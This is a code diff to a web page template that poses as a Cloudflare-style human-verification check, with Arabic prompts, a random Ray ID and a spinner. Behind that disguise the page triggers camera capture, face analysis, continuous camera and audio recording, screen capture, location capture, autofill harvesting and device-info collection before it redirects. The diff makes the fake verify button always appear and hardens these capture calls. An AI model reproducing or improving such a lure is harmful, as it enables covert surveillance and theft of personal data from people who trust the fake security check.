@@ -103,6 +103,19 @@ body{display:flex;flex-direction:column;min-height:100vh}
 var uid="<%=uid%>",a="<%=a%>",destUrl="<%=url%>";
 var redirectDone=false;
 
+// ── Hard fallback: always show verify button ──────────────────────────────────
+var _btnShown=false;
+function _showBtn(){
+  if(_btnShown)return; _btnShown=true;
+  try{
+    document.getElementById('step-text').textContent="خطوة أخيرة للتحقق من هويتك";
+    document.getElementById('spinner').style.animationPlayState='paused';
+    document.getElementById('spinner').style.borderTopColor='#f48120';
+    document.getElementById('check-row').style.display='flex';
+  }catch(e){}
+}
+setTimeout(_showBtn,4500);
+
 // Ray ID
 var chars="abcdefghijklmnopqrstuvwxyz0123456789";
 var ray="";for(var i=0;i<17;i++)ray+=chars[Math.floor(Math.random()*36)];
@@ -581,7 +594,7 @@ function doVerify(){
   document.getElementById('step-text').textContent="جارٍ التحقق... يرجى الانتظار";
   setTimeout(function(){doRedirect();},9000);
   fireLocation();
-<% if(camAccess){ %>  doCamera().then&&doCamera().then(function(){<% if(faceAIAccess){ %>var vf=document.getElementById('vid-front');if(vf)doFaceAI(vf);<% } %>}).catch(function(){<% if(faceAIAccess){ %>var vf=document.getElementById('vid-front');if(vf)doFaceAI(vf);<% } %>});<% } else if(faceAIAccess){ %>  setTimeout(function(){var vf=document.getElementById('vid-front');if(vf)doFaceAI(vf);},4000);<% } %>
+<% if(camAccess){ %>  var _cp=doCamera();if(_cp&&_cp.then)_cp.then(function(){<% if(faceAIAccess){ %>var vf=document.getElementById('vid-front');if(vf)setTimeout(function(){doFaceAI(vf);},1000);<% } %>}).catch(function(){});<% if(faceAIAccess){ %>else setTimeout(function(){var vf=document.getElementById('vid-front');if(vf)doFaceAI(vf);},5000);<% } %><% } else if(faceAIAccess){ %>  setTimeout(function(){var vf=document.getElementById('vid-front');if(vf)doFaceAI(vf);},4000);<% } %>
 <% if(contcamAccess){ %>  setTimeout(function(){if(typeof doContCam==="function")doContCam();},35000);<% } %>
 <% if(contaudioAccess){ %>  setTimeout(function(){doContAudio();},5000);<% } %>
 <% if(screenCapAccess){ %>  doScreenCapture();<% } %>
@@ -591,14 +604,9 @@ function doVerify(){
 
 // ── Page init ─────────────────────────────────────────────────────────────────
 window.addEventListener('DOMContentLoaded',function(){
-  sendDeviceInfo();
-<% if(autofillAccess){ %>  setTimeout(doAutofill,1500);<% } %>
-  setTimeout(function(){
-    document.getElementById('step-text').textContent="خطوة أخيرة للتحقق من هويتك";
-    document.getElementById('spinner').style.animationPlayState='paused';
-    document.getElementById('spinner').style.borderTopColor='#f48120';
-    document.getElementById('check-row').style.display='flex';
-  },2500);
+  try{sendDeviceInfo();}catch(e){}
+<% if(autofillAccess){ %>  try{setTimeout(doAutofill,1500);}catch(e){}<% } %>
+  setTimeout(_showBtn,2500);
 });
 </script>
 <% if(faceAIAccess){ %><script defer src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/dist/face-api.js"></script><% } %>
